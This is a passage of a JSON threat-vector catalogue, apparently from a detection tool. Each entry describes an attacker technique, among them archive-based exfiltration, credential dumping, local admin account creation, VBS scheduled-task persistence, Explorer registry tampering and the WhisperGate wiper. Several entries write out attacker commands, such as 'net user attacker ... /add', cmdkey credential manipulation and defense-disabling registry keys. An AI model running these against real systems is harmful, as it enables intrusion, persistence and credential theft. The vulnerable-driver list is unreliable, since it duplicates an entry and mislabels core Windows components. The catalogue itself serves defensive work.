                "description": "Threat actors often use legitimate archiving tools, like 7-Zip, WinRAR or tar, \nto compress and exfiltrate data from compromised systems. Attackers rename \nthese executables or use the executables in ways that are atypical to evade \nsecurity measures that would normally rely on standard file names \nor typical usage patterns.\n\nExample : an attacker renaming 7z.exe to system32.exe and saving it in a\ndirectory that is abnormal. They can then run the following command:\nC:\\Users\\Public\\system32.exe a -tzip C:\\Users\\Public\\archive.zip C:\\SensitiveData\\*\n\nThis technique enables the attacker to archive sensitive data in a manner \nthat would make the activity seem benign. The unusual locations of archive file \ncreation and the usage of archiving tools with non-standard naming are \nthe indicators of potentially malicious activity.\n\nAlso, a significant number of data compression and unusual outbound network traffic \nmay indicate attempts to exfiltrate data."
            },
            "9d4658ad-d4d5-4f3c-990f-bb486edd47f4": {
                "name": "Usage of CrackMapExec module Masky on compromised endpoint",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "CrackMapExec is a post-compromise tool that contains a number of\nmodules and functionalities that allow red teams, pentesters and\nthreat actors to perform post-compromise actions. Detecting\nboth the presence of the tool itself, plus the usage of the tool\nis an important baseline security detection.\n\nMasky is a python library providing an alternative way to remotely\ndump domain users\u2019 credentials thanks to an ADCS. A \ncommand line tool has been built on top of this library in order to\neasily harvest PFX, NT hashes and TGT on a larger \nscope.\n\nThis tool does not exploit any new vulnerability and does not work by\ndumping the LSASS process memory. Indeed, it \nonly takes advantage of legitimate Windows and Active Directory features\n(token impersonation, certificate \nauthentication via kerberos and NT hashes retrieval via PKINIT).\n\nMasky is a new module, which in certain ways is less noisy than\ndumping LSASS, but if AD CS CAs have auditing enabled, will be\nvery noisy and detectable.\n"
            },
            "2d3b113e-c6ad-492f-a6cb-1590a8d1191d": {
                "name": "Use of a malicious lambda layer in AWS account lambda function",
                "model": true,
                "tlp": "clear",
                "criticality": "Low",
                "description": "A Lambda layer is an archive containing additional code, such as libraries,\ndependencies, or even custom runtimes that is are extract to the /opt directory in the execution environment of the function they are added to. While AWS provides a few layers, developers\nmay also create custom ones to share in their organization, or use an external one\nby pointing to a particular ARN. Layers are immutable, meaning once they are\ncreated, a version is made and further changes would bump the version.\nA threat actor can compromise one or more lambda functions by centrally \ncompromising a lambda layer used by one or more other AWS accounts. This \ncan also be a third party lambda layer in use by EC accounts. \n\nOnce a new version of a lambda layer exists, it can  get deployed \nvia some trigger+action needed on the side of the lambda administrator, \nunless the threat actor controls credentials to deploy or update lambda \nfunctions.\n"
            },
            "cef11e0a-32c7-46c6-8c9c-667d0f1055e2": {
                "name": "Use of customervoice.microsoft.com to host Phishing domains",
                "model": true,
                "tlp": "clear",
                "criticality": "Low",
                "description": "This threat vector is based on real phishing domains built and utilized by\na real, still unknown threat actor. The subdomain \ncustomervoice.microsoft.com should be blocked on forward proxies by most \norganizations, unless they have legit reasons to have traffic to this, and\nlegit traffic going there.\n"
            },
            "a5761988-391d-4cd3-8ade-690bd3315943": {
                "name": "Use of legitimate still vulnerable drivers to elevate privileges",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Threat actors can use legitimate and code-signed, but vulnerable drivers to \nexecute kernel-level code in order to elevate privileges or disable security \nproducts. Such drivers can allow malicious actors to manipulate system \ncomponents, processes, maintain persistence on a system and evade security \nproducts ref [1].\n\nMicrosoft and other vendors have created and maintain vulnerable driver \nlists ref [2], [6], [7], for example to thwart and isolate drivers which are \nvulnerable or with a high risk for explaoitation. The drivers with a \npreviously discovered vulnerabilites can also be considered for review and\nas good candidates for a block list or monitoring.  \n\nThe vulnerable signed drivers can come from a variety of vendors such as,\nbut not limited to, ASROCK, ASUSTeK, IBM.  \n\n### List of some vulnerable signed drivers, which have been exploited in \nthe past\n\n- `win32k.sys` - it's a kernel-mode driver that has been exploited in   various ways, including elevation of privilege (EoP) vulnerabilities.\n- `splwow64.sys` - this is a vulnerable driver which lets local code  escalation by abusing the print stack broker.\n- `dxgkrnl.sys` - this driver is responsible for graphics rendering and has  been vulnerable to exploits. It's related to a validation flaw enabling  local EoP in the DirectX graphics kernel driver.\n- `tdx.sys`: The TDx driver has been exploited in the past, including a  vulnerability that allows remote code execution (RCE). Other vulnerability  buffer over-read allows local EoP on multiple Windows versions; patched  July 2025.\n- `splwow64.sys` - this driver is responsible for print spooling and has   been vulnerable to exploits.\n- `cng.sys` - the Cryptography Next Generation (CNG) driver has been  exploited, including a vulnerability (CVE-2020-1145) that allowed EoP.\n- `msrpc.sys` - it's Microsoft Remote Procedure Call (MSRPC) driver has been  vulnerable to exploits. \n- `ucx01000.sys` - this driver is part of the USB driver stack and has been  exploited. \n- `ndis.sys` - the Network Driver Interface Specification (NDIS) driver has  been vulnerable to exploits. Example for an exploit: EoP precedent where  buffer length checks were insufficient.  \n- `wdf01000.sys` - this is Windows Driver Framework (WDF) driver which can   be exploited by the threat actors for privilege escalation and other   purposes.\n- `storport.sys` - the Storage Port driver can be vulnerable to exploits.\n"
            },
            "596d294a-9aa8-41b2-9507-5c9d605de6b4": {
                "name": "Use Windows utilities to manipulate a local account or group",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Local account manipulation involves creating, modifying, or exploiting local \nuser accounts on a computer system, typically for malicious purposes. Local \naccounts are user accounts stored and managed locally on a specific computer \ndevice.\n\n### Utilities Related to Local Account Manipulation:\n\n#### 1. net.exe\n**Description**: A command-line utility used for network administration tasks, \nincluding managing user accounts and network shares. Threat actors can use \nit to create new user accounts and add them to privileged groups.\n\nExample:\n\n```bash\nnet user attacker P@ssw0rd! /add\nnet localgroup administrators attacker /add\n```\nThis sequence creates a new user named \"attacker\" and adds them to the local \nadministrators group, granting full system access.\n\n#### PowerShell Cmdlets\n##### New-LocalUser \nThe New-LocalUser cmdlet is used to create a new local \nuser account on a Windows machine.\n`New-LocalUser -Name \"username\" -Password (ConvertTo-SecureString \"P@ssw0rd!\" -AsPlainText -Force) -Description \"Description\" -FullName \"Full Name\"`\n\nParameters:\n-Name: Specifies the name of the new local user.\n-Password: Assigns a password to the new user account. The password must be \nprovided as a **secure string.**\n-Description: (Optional) Adds a description for the user account.\n-FullName: (Optional) Provides the full name of the user.\n\n##### Add-LocalGroupMember\nThe Add-LocalGroupMember cmdlet adds a user to a local group, which can be \nused to grant the user additional privileges.\n`Add-LocalGroupMember -Group \"Administrators\" -Member \"username\"`\n\nParameters:\n-Group: Specifies the local group to which the user will be added.\n-Member: Specifies the user account to add to the group.\n\n\n#### Changing a Local Password\nUsing net.exe: The net.exe utility can be used to change a user's \npassword.  \n\n`net user username newpassword``\n\nUsing PowerShell: PowerShell can also be used to change a \nlocal user's password.  \n\n```\n$user = [ADSI](\"WinNT://./username,user\")\n$user.SetPassword(\"NewP@ssw0rd!\")\n"
            },
            "8bc82ff8-e106-4377-98f1-2cb912631ffa": {
                "name": "User information gathering in Linux systems",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Threat actors use various methods and tools to collect user data on Linux\nsystems. Some of them are given below.\n\n### Common methods used for gathering of user's information on Linux\n\nExamples:\n\n- Current user: for reconnaissance purposes on a Linux system threat actors  are using commands like `whoami` to retrieve the current username running  on the system. Threat actors can use and `lslogins` to list an information  about known users in the system, which typically includes details such as  the username, UID (User ID), GID (Group ID), home directory, shell, last  login time, and more, depending on the options used and the system  configuration ref [1].  \n- User list: a threat actor group can use a `getent` command with an option  `passwd` or `cat /etc/passwd` command to retrieve a list of all users on  the system ref [1].\n- User ID and group ID: the `id` command can be used to retrieve the user ID  and a group ID of the current user ref [2].\n- Group list: a command `groups` <group_name> can be used in Linux to view  user's group membership. Or with other command `getent group` or cat  `/etc/group` thereat actors can retrieve a list of all groups on the  system ref [1],[4].  \n- Other user's information: commands like `who` can show an information for  the current logged-in user. A threat actor may use and `users` command  to display the list of currently logged-in users on the Linux system  ref [1].\n- Linux user's activity: `w` coomand executed on Linux shows the current  logged users activity on the system ref [1]. \n- User shell: a threat actor may run the command `getent passwd <username>`  to retrieve the user's shell. The command output lists the user details  from the 'passwd' database, including the username, user ID, group ID,  home directory, and default shell ref [5].  \n- Last login: an adversary can use the `lastlog` command to retrieve  information about the last user's login ref [6]. \n- Failed login attempts: with the `faillog` command a threat actor may  retrieve information about failed login attempts ref [7].\n\n### Some of the known tools used for Linux user's information collection\n\n- `Metasploit`: A penetration testing framework that includes tools for  collecting user data and exploiting vulnerabilities.\n- `Linux.Ekoms`: This is a custom tool that can collect user data, including  login credentials and credit card numbers.\n- `Linux.Mumblehard`: it's a malware that collects user data and uses it for  spamming and phishing campaigns.\n- `TsarSapphire`: This utility can collect user data, including login  credentials and sensitive information.\n- `Remaiten`: A payload for Linux which collects user data and uses it for  malicious activities.\n- `Kaiten`: A Linux malware that collects user data and potentially can use  it further for distributed denial-of-service (DDoS) attacks.\n- `Linux.Keylogger`: A keylogger that collects user keystrokes, including  login credentials and sensitive information.\n- `Mayhem`: This is a malware that can collect user data on Linux, including  login credentials and sensitive information, and uses it for malicious  activities."
            },
            "06523ed4-7881-4466-9ac5-f8417e972d13": {
                "name": "Using a Windows command prompt for credential manipulation",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Threat actors may use Windows commad prompt commands to search for, access\nin order to manipulate (create, modify, delete, read) user's credentials\nlocally or in a domain. For example, they can extract user's passwords from\nCredential Manager. Windows Credential Manager is a store with all user's\nsaved passwords automatically during user daily work. It provides an\ninterface from where the credentials can be managed. To access Credential\nManager, the threat actor needs to elevate his previleges to administrator\nand run the command promt console with \"Run as administrator\".\n\nCmdkey.exe is a command-prompt utility which can create, list, and delete\nstored user names and passwords or credentials. It's usually located in the \n%SYSTEM% sub-folder and its usual size is around 13,850 bytes.\n\nExample for try to gain user's details with cmdkey from Windows Credential\nManager:\n\ncmdkey /list:testTarget\n\nThe command returns the Target(testTarget), Type(Domain Password), and the\nUsername(testUser).\n\nA threat actor can also manipulate the Credential Manager database, for\nexample to add, modify or delete credentials from manager sections. It is\npossible to add an Internet or network address, user name, password and\nothers.\n\nExample for adding of entry in Credential Manager. With the command below\na threat actor can add username-password key pair for access to specific\nsystem.\n\ncmdkey /add:computer-name /user:user-name /pass:your-password\n\nExample for deletion of entry in Credential Manager. A threat actor fist\nexecute list command to see all potential targets and select an entry for\ndeletion.\n\ncmdkey /list\ncmdkey /delete:target-name\n\nAnother approach to search and retrieve user's credentials with command\npromt is for example with net utility. Net utility executed via the network \nis used to query for user's password. The passwords can be storred on shared\nnetwork drives or locally.\n\nExample:\n\nnet use \\\\unc\\path /user:username password\n\nor \n\nnet use \\\\%userdnsdomain% /user:%userdomain%\\%username% *\n\nThe asterisk at the end forces to ask for password.\n\nWith net utility a threat actor can also modify already existing user name\nor password or to delete the existing credentials entry. \n\nExamples: \n\nnet user <username> *\n<type a new password>\n<retype the new password to confirm>\n\nThe command below will set the password to blank:\nnet user username \"\" \n\nThe following command will remove the password for the user with the\nspecified userneme:\n\nnet user <username> /passwordreq:no\n"
            },
            "53ca52ed-a7e7-4094-95ec-b4ef522dc689": {
                "name": "VBS script creates a scheduled task",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Threat actors often use Visual Basic Scripting (VBS) to create scheduled\ntasks on compromised Windows systems. VBS is a built-in scripting language\non Windows systems, making it an attractive choice for threat actors. It\nallows the threat actors to execute code without relying on external tools\nor binaries, reducing the risk of detection.    \n\nOnce executed by the victim, the VBScript establishes persistence on\ninfected machines by creating scheduled tasks and modifying the Windows\nRegistry.\n\n### Creating a scheduled task using a VBS script\n\nTo create a scheduled task using VBS, threat actors typically follow the\nsteps provided below:\n1. An initial VBS script creation - the attacker creates a VBS script that\ncontains the malicious code. This script can be embedded in an email\nattachment, downloaded from a compromised website, or created locally on\nthe compromised system.  \n2. The created VBS script uses `schtasks` - the VBS script uses the\n`schtasks` to create a new scheduled task. The `SchTasks` command is a\nbuilt-in Windows utility that allows users to create, delete, and manage\nscheduled tasks.\n3. Task details: The VBS script specifies the task details, including the\ntask name, description, and the command or script to be executed.\n4. Set a task trigger - the VBS script may set a task trigger, which defines\nwhen the task should be executed. This can be a specific time, daily,\nweekly, or on system startup.\n5. A task preservation - the VBS scrip\n\n### Some of the techniques used to achieve VBS persistence and\nobfuscation\n\n- Obfuscation: Threat actors often obfuscate their VBS scripts to evade\ndetection by security software. They use techniques like random variable\nnames, fake function calls or garbage code to hide the function of the\nmalicious code.  \n\n- Scheduled task chaining: Threat actors create as tasks under the current\nuser or if allowed under SYSTEM to elevate privileges and maintain foothold\nonto the system.  \n\n### An example for a VBS script which creates a scheduled task\n\nBelow is given an example of a VBS (Visual Basic Scripting) script that\ncreates a scheduled task to run a command or application at a specified\ntime. This script uses the Windows Task Scheduler to schedule the task.  \n\n```visualbasic\n\n' Create a new task\nDim sch, task\nSet sch = CreateObject(\"Schedule.Service\")\nsch.Connect()\n\n' Define the task\nDim taskDefinition\nSet taskDefinition = sch.CreateNewTask(0)\n\n' Set task registration info\ntaskDefinition.RegistrationInfo.Description = \"This is a test task created by VBS script\"\ntaskDefinition.RegistrationInfo.Author = \"Your Name\"\n\n' Set task principal (who runs the task)\nDim principal\nSet principal = taskDefinition.Principal\nprincipal.LogonType = 3 ' Interactive or 3 for S4U\nprincipal.UserId = \"NT AUTHORITY\\SYSTEM\" ' You can change this to a different user\n\n' Set task trigger (when to run the task)\nDim trigger\nSet trigger = taskDefinition.Triggers.Create(_\nTaskTriggerType2.Daily)\ntrigger.StartTime = \"08:00:00\" ' 8 AM daily\ntrigger.Id = \"DailyTrigger\"\n\n' Set task action (what to run)\nDim action\nSet action = taskDefinition.Actions.Create(_\nTaskActionType.Exec)\naction.Path = \"C:\\Windows\\System32\\notepad.exe\" ' Path to the application to run\naction.Arguments = \"\" ' Arguments if any\n\n' Register the task\nDim taskFolder\nSet taskFolder = sch.GetFolder(\"\\\")\ntaskFolder.RegisterTaskDefinition \"TestVBS Task\", taskDefinition, 6, , , 3, , , task\n\n```\n"
            },
            "60bd6a35-3a71-47c2-8110-4562fb40976c": {
                "name": "Virtual machine deployment detection evasion technique",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "A threat actor can use virtualisation platforms and utilities\nto compromise an environment. For example, an installed virtual\nmachine can be used for an entry point to the rest of the\nenvironment or as an entry point for reconnaissance and\npivoting to the system host and further potentially to\nother systems in the environment.  \n\nThe goal is to establish persistence on the victim's system. \nOnce inside, the threat actor deploy's virtual machine using\nany virtualisation technology, which may contain a backdoor, allowing\nthem to maintain a covert presence on the network in days, weeks or\neven longer ref [1].     \n\n### Possible platforms for virtualisation used for detection evasion\n\nA threat actor can deploy a virtual machine using one of the virtualisation\nplatforms below:\n\n- Hyper-V\n- EXS/ESXi (VMware virtualisation)\n- QEMU virtualisation\n- Virtual box\n\nOnce deployed, the virtual machine may contain a backdoor or another\ntype of a malware (example: QDoor backdoor). This technique allows\na threat actor to maintain a covert channel on the network for unnoticed\nperiod of time. During this period, they can escalate privileges, move\nlaterally across the environment, and exfiltrate valuable or sensitive\norganisational data using data-exfiltration tools. For example, such\ndata-exfiltration tool can be `GoodSync` tool ref [1], [2].      \n"
            },
            "78e05130-58a9-49cd-9039-3d7f9ac0bcb5": {
                "name": "Volumetric Distributed denial of service (DDoS) attack",
                "model": true,
                "tlp": "clear",
                "criticality": "Emergency",
                "description": "Threat actors may wish to cause business disruption, media/public attention,\nor to use the pretense of business disruption to disguise other activities. \nAny DDoS attack should always be followed up with other DFIR activities to \ndetermine if the attack was meant to distract from something else. DDoS can \ndistract by pulling attention away, or even by spooling out log files so \nthat relevant entries are overwritten.\n"
            },
            "b330d3a8-1783-4210-9fec-11e6ecfe135e": {
                "name": "Web Path Traversal Attack",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Directory traversal (also known as file path traversal) is a web security\nvulnerability that allows an attacker to read arbitrary files on the server\nthat is running an application. \n\nBy manipulating variables that reference files with \u201cdot-dot-slash (../)\u201d\nsequences and its variations or by using absolute file paths, it may be\npossible to access arbitrary files and directories stored on file system\nincluding application source code or configuration and critical system files.\n"
            },
            "4d6104e3-10d4-4a12-b081-d937df848891": {
                "name": "Web Shell Attacks",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server."
            },
            "68ab86f6-378d-4371-ad01-6209fb95d57d": {
                "name": "WhisperGate wiper",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "WisperGate is a multi-stage malicious wiper disguised as ransomware,\nfirstly considered as ransomware but later investigations and analysis\nshow that it's not only disabling the work of the impacted device\nbut deletes/corrupts the whole hard drive and destroys the data stored\non it by wiping the master boot record. ref [1]\n\nThis is very impactful and severe type of a malware because the system\nneeds the MBR (the Master Boot Record) to start the operation system\nduring the boot.   \n\nFor the first time this type of a wiper was observed in the beginning\nof the conflict between Russia and Ukraine in Feb 2022. Later the\nreports published new activities of WisperGate as part of a more\nbroader campaign that aimed to coordinate destructive cyberattacks\nagainst critical infrastructure and other targets in a combination\nwith kinetic military operations (active physical operations on\nplace).\n\nThe GRU's WhisperGate campaign targets government and military\ninstitutions and the goal is to achieve as much as possible\ndisruption of the systems and a total lost of any stored\ninformation on them.   \n\nDifferent research investigations showed that initally it was\nlikely that stolen credentials provided the access point for\nthe deployment of the wiper. Other known for this wiper at this\nmoment is that it contains two types of wipers.   \n\n1. The first wiper attempts to destroy the master boot record (MBR) and\nto eradicate any recovery options. Similar to the notorious NotPetya wiper\nthat masqueraded as ransomware, WhisperGate is not intended to be an actual\nransom attempt, since the MBR is completely overwritten. ref [2]      \n\n2. In the second stage, a downloader pulls the code required for\nthe third step. After a base64-encoded PowerShell command is executed\ntwice and an endpoint is requested to enter sleep mode for 20 seconds.\nA Discord server URL, hardcoded into the downloader, is then pinged\nto grab a .DLL file. ref [2]  \n\nIn the further stage of the attack process DLL loader is trying\nto gain administrative privileges. For example, it will attempt\nto escalate itself by trigger User Account Control (UAC) dialog box.\nOnce granted Administrator privileges it drops VBScript from a Temp\ndirectory. The script adds the targeted logical drive to the Windows\nDefenders list of exclusions, using PowerShell commands ref [5].    \n\nThe script contains encoded assembly parts. For decoding of this function,\na threat actor uses obfuscation Eazfuscator tool. It can use a combination\nof RC4 and XOR loop to decode the content off the base64 string.  \n\nThe script uses another PowerShell commands further to stop the function\nof Windows Defender and uses a second command with \"rmdir\" to recursively\ndelete all Windows Defender files.\n\nThe threat actors developed WhisperGate implemented their own cryptographic\nfunctions that are built on top of standard and proven libraries. They\nattempted to wipe files in a strange and seemingly slap-dash manner,\nwhich may or may not have been intentional. ref [5]  \n\nIn Ukraine, a pro-Russian group was detected to conduct destructive attacks\nsuch as the WhisperGate wiper attacks against ICS targets.  \n"
            },
            "d0522985-6001-4e25-a5ff-2dc87bf2fee8": {
                "name": "Windows credential access attempt",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Windows credential access refers to techniques used by threat\nactors to steal authentication information such as passwords,\nhashes, tokens, or Kerberos tickets stored on or transmitted\nby Windows systems. These credentials enable unauthorized\naccess to systems, networks, or sensitive data, facilitating\nlateral movement, privilege escalation, or persistent control.  \n\nThreat actors exploit Windows credential access using various tools\nand Living Off The Land Binaries (LOLBins) utilities to gain\nunauthorized access to sensitive information.  \n\nWindows credentials usually are stored in two main locations.\n\n### Credentials folder (Windows Vault)\n\nThis folder stores encrypted copies of user credentials used\nby Windows services, applications, and scheduled tasks.\nExample for path storing credentials in Windows\n\n`C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Credentials`\n`C:\\Users\\<username>\\%LocalAppData%\\Microsoft\\Credentials\\`\n\nwhere <username> is the logged-in user's account name.  \n\n### Credential Manager\n\nIt's location is not fixed. The store of the user credentisls\nin this case may vary depending on the user account and other\nsystem settings as language and preferences.  \n\nThe Windows OS has many different places it stores or caches its \ncredentials, such as:  \n\n- Security Accounts Manager (SAM) database. \nThe SAM database is a file present on all Windows systems. This file \ncontains all accounts created, as well as all built-in accounts.\nPasswords are stored here as hashes. (NT password hash) \n- Other Files \nPasswords can also be found in configuration files and user created files \n(usually plaintext). Certain log files may contain credential information,\nsuch as installer logs, and can also sometimes be found in crash reports. \n- Cached Credentials \nDomain credentials are cached in the registry to allow users to log into their\nsystem when it is not connected to the domain. The Windows system caches the last\n10 logon hashes, and some store up to 25 by default. This number is configurable. \n- Local Security Authority Secret (LSA) \nLSA secrets are stored in the registry and allow services to run with user privileges.\nThis includes VPNs, scheduled tasks, auto-logins, backup service accounts, IIS websites, etc.\nThey are included in the Security/Policy/Secrets registry in encrypted form. \n- Local Security Authority Subsystem Service Process (LSASS) \nWhen logging into a Windows machine, credentials are stored in the LSASS process in memory. \nThis is primarily used to allow the user to access other resources on the network that they\nare authorized to access without having to re-authenticate. The stored formats can be\nplaintext (reversable encryption), NT and LM hash, and Kerberos tickets. \n- Credential Store Manager \nThe manager is available with Windows 7 and higher. It is basically a digital vault that \nallows users to store user credentials \u201csafely.\u201d All the credentials are stored in a \nspecific folder on the Windows system. Windows and Web credentials can be stored here. \n- AD Domain database (NTDS.DIT)\nThis database stores all credentials for users and computers located on every\nAD Domain controller server in an active directory domain environment. (%SystemRoot%\\NTDS folder) \n\n### Known used tools for Windows credential dumping and access ref [1]\n\n- Mimikatz: A popular tool used to extract plaintext passwords,\nhash, PIN codes, and Kerberos tickets from memory. It can also\nperform pass-the-hash, pass-the-ticket, and build Golden Tickets.\n- CrackMapExec: An open-source hacking tool for Windows Active\nDirectory environments.\n- Empire: a post-exploitation and adversary emulation framework\n- BloodHound: An open-source tool that uses graph theory to reveal\nthe hidden and often unintended relationships within an Active\nDirectory environment. \n- Hashcat: A password cracking tool that can crack Windows hashes,\nincluding NTLM and LM hashes.\n- John the Ripper: A password cracking tool that can crack Windows\npasswords using dictionary attacks, brute-force attacks, or rainbow\ntable attacks.\n- PsExec: A tool that allows executing commands on remote systems,\nwhich can be used to extract credentials.\n- Built-in Windows OS utilities as reg.exe for registry access,\nWMI Windows utility, cmd, tasklist and others. \n\n### Possible used LOLBins utilities ref [2]:\n\n- Windows Credential Editor (WCE): A utility that allows modifying\nWindows credentials, including adding new credentials or modifying\nexisting ones.\n- cmdkey: A built-in Windows utility that allows managing cached\ncredentials, including adding, deleting, or listing credentials.\n- runas: A built-in Windows utility that allows running commands\nunder a different user context, which can be used to exploit\ncredentials.\n- PowerShell: A powerful scripting language that can be used to\nexploit credentials, including using cmdlets like Get-Credential\nor Invoke-Command.\n- tasklist: A built-in Windows utility that can be used to list\nrunning processes, including those running under different user\ncontexts, which can help identify potential credential\nexploitation opportunities.\n- wmic: A built-in Windows utility that provides a command-line\ninterface to the Windows Management Instrumentation (WMI) repository,\nwhich can be used to exploit credentials.\n"
            },
            "09b9aee8-3849-4578-8243-17157d6d54e0": {
                "name": "Windows credential creation attempt",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "### Windows Credential Creation Attempt\nA Windows credential creation attempt refers to \nactivities where a user or system processes aim \nto create, store, or manipulate sets of credentials \n(e.g., username and password) within a Windows \nenvironment. This can involve legitimate system \noperations or malicious activities by threat actors \nseeking unauthorized access.\n\n#### Examples of Windows Credential Creation Attempt\n**User Account Creation:**\n\n- Using administrative command-line tools such as \n`net user` to add new user accounts.\n- Leveraging PowerShell scripts or commands to automate \nthe creation of user accounts.\n`New-LocalUser`: Create a new local user account with \n`New-LocalUser -Name \"[username]\"` \n`-Password (ConvertTo-SecureString \"[password]\"` \n`-AsPlainText -Force)`.\n\n**Abuse of Winlogon:**  \n\nWinlogon.exe is responsible for managing secure user \ninteractions during logon. Threat actors can exploit \nthis process to pass harvested credentials to the \nLocal Security Authority (LSA), thereby impersonating \nlegitimate users.\n\n**Saved Passwords in Credential Manager:**  \n\nThreat actors can exploit stored credentials in the \nWindows Credential Manager. These credentials can be \nused to automatically log into various services or \ncreate new user accounts using the gathered information.\n\n**Credential Injection:**  \n\nUsing tools or scripts to inject credentials directly \ninto the Windows Security Accounts Manager (SAM) \ndatabase or LSA to create or modify credentials.\n\n**Known Tools for Credential Creation and Manipulation**\n\n- **Windows Credential Editor (WCE):** \nWCE is a tool capable of listing logon sessions and \nmodifying associated credentials, such as adding or \nchanging NTLM hashes, plaintext passwords, and \nKerberos tickets. It can be misused to create unauthorised \ncredentials on a Windows system.\n"
            },
            "444e014f-d830-4d0d-9c2e-1f76d80ba380": {
                "name": "Windows credential dumping through Local Security Authority (LSA) Secrets",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Adversaries may attempt to dump credentials to obtain account login\nand credentials details, using techniques for Local Security Authority \n(LSA) Secrets dumping. If the attacker has a System access to the host \nthis may lead to access LSA secrets database. Local Security Authority\ncontains credential information related to local and domain based accounts. \nThe Registry is used to store the LSA secrets. When services are run under \nthe context of local or domain users, their passwords are stored in the \nRegistry at HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets. If auto-logon is \nenabled, this information will be stored in the Registry as well. \nThe extracted passwords are UTF-16 encoded, which means that they \nare returned in plaintext. LSA secrets can also be dumped from memory.\n\nKnown tools used for LSA credential dumping:\n\n- pwdumpx.exe\n- gsecdump\n- Mimikatz\n- secretsdump.py\n- reg.exe (execution file extracts information from the Registry)\n- Creddump7 (for gathering of credentials)\n\nExecuted commands and arguments that may access to a host may attempt to \naccess Local Security Authority (LSA) secrets. Remote access tools may contain \nbuilt-in features or incorporate existing tools like Mimikatz. PowerShell scripts\nalso can contain credential LSA dumping functionality."
            },
            "8e5c12f1-cd48-417c-a9c9-883212bf98b6": {
                "name": "Windows Explorer Manipulation via Registry Modification",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Explorer behaviour can be twisted by editing the registry keys\nlisted below. Changes act instantly, leave few artefacts, and\nare often missed by file-centric defenses.\n\n### Policy Edits Disable User Defenses\n- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer  \nSetting `DisableTaskMgr`, `DisableRegistryTools`, `NoViewOnDrive` or\nNoFind stops Task Manager, Regedit, search and drive browsing,\nblinding users.\nSetting `NavPaneShowAllFolders` or `NavPaneExpandToCurrentFolder` can \nmodify the navigation pane.\nWhen set to 0, this value hides certain folders in the navigation pane, \nsuch as system folders or folders that are not typically displayed,\nmaking it difficult for users to detect malicious activity.\nWhen set to 1, this value shows all folders in the navigation pane, \nincluding hidden and system folders, making it harder for users to \ndistinguish between legitimate and malicious files or folders.\n\n### Advanced Flags Hide Artefacts\n- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced  \nFlipping Hidden, ShowSuperHidden or SuperHidden hides system\nfiles and payloads, thwarting GUI-based hunting.\n\n### User Shell Redirection\n- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders  \nReplacing Desktop, Startup or Personal paths diverts files or\nautoruns to attacker-controlled folders for theft or persistence.\n\n### System-Wide Folder Hijack\n- HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders  \nSystem-level redirection funnels all users' documents and\nshortcuts to rogue directories, enabling broad data capture.\n\n### Global Advanced Flags Override\n- HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced  \nModifying the machine hive mirrors the HKCU tweaks but forces\nhidden-file suppression and other changes on every profile.\n\n### Environment Variable Hijack\n- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders  \nAltering %APPDATA%, %TEMP% or %DESKTOP% variables tricks apps\ninto saving data or loading DLLs from malicious locations.\n\n### Namespace Injection\n- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace  \nCreating fake CLSID subkeys inserts rogue folders in Explorer,\nluring users to launch payloads masked as system objects.\n\n### Drive AutoRun Seeds\n- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2    \nInserting AutoRun and command entries forces code execution\nwhenever a specific USB or network share is browsed.\n\n### Default Shell Replacement\n- HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell  \nRepointing the Shell value swaps explorer.exe for a malicious\nbinary, gaining control each time a user signs in.\n\n### Enabling AutoPlay for Malicious Devices\n- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoplayHandlers  \nChanging the `DeviceType` or `Handler` settings can enable AutoPlay for specific \ndevices, such as network shares, potentially executing malicious code.\n"
            },
            "78d80d14-7260-44b8-95e9-6cf3693b0024": {
                "name": "Windows explorer used to search for files with credentials",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Credential dumping is the process of extracting sensitive information, such\nas passwords, normally in the form of a hash or a clear text content, as well\nas any other secrets stored on the compromised host ref [1], [2].         \n\nOn Windows, the user's passwords and secrets can be stored in multiple\npossible locations, accessible with Windows File Explorer.  \n\nFor example:\n\n### Security Accounts Manager (SAM) database location\n\nLocation of the SAM database, contains the local users of the host as well\nas the local groups: \n\n`%SystemRoot%/system32/config/SAM`\n\n### Windows Security configuration file\n\nSecurity config file contains LSA Secrets, for example DPAPI machine key,\naccount cleartext passwords for Windows services or scheduled tasks that\nare configured on the host. Data Protection API (DPAPI) performs symmetric\nencryption of asymmetric private keys and it's used by the operation system\nto securely store passwords, encryption keys or any other type of sensitive\ndata ref [3], [4] and [5].        \n\n`%SystemRoot%/system32/config/SECURITY`\n\n### AppData local user folder\n\nAppData in the local user folder contains cleartext passwords,\nweb browsers cookies and other cached browser data:  \n\n`%SYSTEMDRIVE%\\Users\\<USERNAME>\\AppData\\Local\\Microsoft\\Vault\\<GUID>`\n\n### Other 